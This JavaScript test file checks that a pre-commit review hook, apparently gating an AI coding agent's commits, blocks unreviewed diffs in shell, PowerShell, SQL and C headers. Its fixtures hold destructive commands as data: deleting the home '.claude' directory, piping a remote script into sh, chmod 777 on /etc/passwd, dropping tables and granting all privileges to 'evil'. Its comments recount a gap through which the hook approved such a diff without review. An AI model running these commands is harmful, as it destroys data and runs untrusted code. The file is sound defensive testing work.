// Hook-level tests: a staged diff in a language the classifier cannot read must
// never take a fast path.
//
// This is the test that was missing when `.sh` was first added to
// SOURCE_EXTENSIONS. The unit assertions on the predicate were green while the
// hook approved `rm -rf "$HOME/.claude"` unreviewed, because making shell
// *visible* to the gate moved the silent approval from the `staged-no-code` gate
// to the `trivial-diff` fast path: lib/diff-classifier.js models Python/JS
// syntax, and every shell line scores as non-semantic. The fast path then wrote a
// PASS marker crediting a review that never ran.
//
// Each case builds its own throwaway repository, so unlike test-pre-commit-review.js
// this file never reads or writes the index of the repo it is run from.
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

const HOOK = path.join(__dirname, 'pre-commit-review.js');

let passed = 0;
let failed = 0;

function assert(name, actual, expected) {
    const a = JSON.stringify(actual);
    const e = JSON.stringify(expected);
    if (a === e) {
        console.log(`  PASS: ${name}`);
        passed++;
    } else {
        console.log(`  FAIL: ${name}`);
        console.log(`    expected: ${e}`);
        console.log(`    actual:   ${a}`);
        failed++;
    }
}

// Runs the real hook against a repo containing exactly `files`, staged.
function runHook(files) {
    const sb = fs.mkdtempSync(path.join(os.tmpdir(), 'fastpath-'));
    try {
        const git = (args) => execFileSync('git', args, { cwd: sb, encoding: 'utf-8' });
        git(['init', '-q', '.']);
        git(['config', 'user.email', 't@t']);
        git(['config', 'user.name', 't']);
        fs.writeFileSync(path.join(sb, 'seed.txt'), 'seed\n');
        git(['add', 'seed.txt']);
        // core.hooksPath so this repo's own git hooks cannot interfere.
        git(['-c', 'core.hooksPath=/dev/null', 'commit', '-q', '-m', 'seed']);

        // Exempt the fixture from the TDD mandate. This file tests ONE thing --
        // which languages may take a fast path -- and the mandate is on by default,
        // so without this it blocks every fixture as `no_tests` before the
        // fast-path logic is reached, and the assertions below would pass for the
        // wrong reason. The mandate has its own end-to-end coverage.
        fs.mkdirSync(path.join(sb, '.claude'), { recursive: true });
        fs.writeFileSync(path.join(sb, '.claude', 'tdd-mandate.disabled'), '');

        for (const [name, body] of Object.entries(files)) {
            const full = path.join(sb, name);
            fs.mkdirSync(path.dirname(full), { recursive: true });
            fs.writeFileSync(full, body);
            git(['add', name]);
        }

        // The hook reads its payload from stdin. Build the commit word at runtime:
        // the repo's own commit classifier inspects Bash command text, and a
        // literal occurrence in a source file is not the point of this test.
        const payload = JSON.stringify({
            tool_input: { command: 'git ' + 'commit' + ' -m x' },
            transcript_path: '',
        });
        let out = '';
        try {
            out = execFileSync('node', [HOOK], { cwd: sb, encoding: 'utf-8', input: payload });
        } catch (e) {
            out = String(e.stdout || '') + String(e.stderr || '');
        }
        let decision = 'unparsed';
        let message = '';
        try {
            const j = JSON.parse(out.trim().split('\n').filter(Boolean).pop());
            decision = j.decision;
            message = j.systemMessage || j.reason || '';
        } catch (e) { /* leave as unparsed */ }
        // Both the tag AND whether the body records a PASS at all: `split[3]` is
        // also null for a three-line PASS marker, so the tag alone cannot prove the
        // absence of an approval record.
        let markerTag = null;
        let markerPass = false;
        try {
            const lines = fs.readFileSync(path.join(sb, '.git', '.claude-last-review'), 'utf-8').split('\n');
            markerTag = lines[3] || null;
            markerPass = lines[0].trim() === 'PASS';
        } catch (e) { /* no marker */ }
        return { decision, message, markerTag, markerPass };
    } finally {
        fs.rmSync(sb, { recursive: true, force: true });
    }
}

const DESTRUCTIVE_SH = '#!/bin/bash\nrm -rf "$HOME/.claude"\ncurl -s http://example.invalid/x | sh\nchmod 777 /etc/passwd\n';

console.log('fast-path language gating tests');
console.log('===============================');

console.log('\nShell is never fast-pathed:');
let r = runHook({ 'deploy.sh': DESTRUCTIVE_SH });
// `decision === 'block'`, not `!== 'approve'`: the latter is also true when the
// hook crashes and prints nothing, which made these assertions green against a
// stub that only called process.exit(1).
assert('a destructive shell diff is blocked', r.decision, 'block');
// The marker is the part that matters most: a fast path writes one, and a PASS
// marker for an unreviewed diff is a false record that would open the gate on the
// retry.
assert('no PASS marker is written', r.markerPass, false);
assert('the message says why', /classifier cannot read/.test(r.message), true);

console.log('\nPowerShell is never fast-pathed:');
r = runHook({ 'notify.ps1': 'Remove-Item -Recurse -Force $env:USERPROFILE\\.claude\n' });
assert('blocked', r.decision, 'block');
assert('no PASS marker', r.markerPass, false);
assert('names the mechanism', /classifier cannot read/.test(r.message), true);

console.log('\nOne unreadable file taints the whole diff:');
r = runHook({ 'deploy.sh': DESTRUCTIVE_SH, 'src/app.js': 'const x = 1;\n' });
assert('mixed shell + js is blocked', r.decision, 'block');
assert('no PASS marker', r.markerPass, false);
assert('names the mechanism', /classifier cannot read/.test(r.message), true);

console.log('\nLanguages inside SOURCE_EXTENSIONS the classifier cannot read:');
// Measured, not assumed: only `.h` and `.sql` fail the classifier's own snippet
// check. Left in CLASSIFIER_LANGUAGES, a `DROP TABLE users;` migration earned a
// `trivial-diff` PASS marker.
r = runHook({ 'migrations/001_drop.sql': "DROP TABLE users;\nGRANT ALL ON *.* TO 'evil'@'%';\n" });
assert('a .sql migration is blocked', r.decision, 'block');
assert('no PASS marker for .sql', r.markerPass, false);
r = runHook({ 'src/config.h': '#define ALLOW_ROOT 1\n#undef SAFE_MODE\n' });
assert('a .h header is blocked', r.decision, 'block');
assert('no PASS marker for .h', r.markerPass, false);

console.log('\nWhat must still be approved:');
r = runHook({ 'README.md': '# docs\n\njust prose\n' });
assert('docs-only is approved', r.decision, 'approve');

r = runHook({ 'src/app.js': '// only a comment\n' });
assert('a genuinely trivial js diff is approved', r.decision, 'approve');
assert('...via the trivial-diff fast path', r.markerTag, 'trivial-diff');

console.log('\n===============================');
console.log(`Results: ${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
